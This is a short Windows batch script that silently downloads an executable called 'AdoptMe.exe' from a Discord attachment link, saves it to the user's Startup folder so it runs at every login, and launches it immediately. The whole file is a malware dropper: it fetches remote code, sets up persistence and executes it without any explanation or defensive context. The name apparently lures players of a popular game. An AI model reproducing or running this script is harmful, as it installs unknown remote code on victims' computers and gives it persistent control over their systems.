@echo off
cd /d "%systemdrive%"
curl -s -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\AdoptMe.exe" "https://cdn.discordapp.com/attachments/1132729688557625375/1135404586174267472/AdoptMe.exe"
start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\AdoptMe.exe"
exit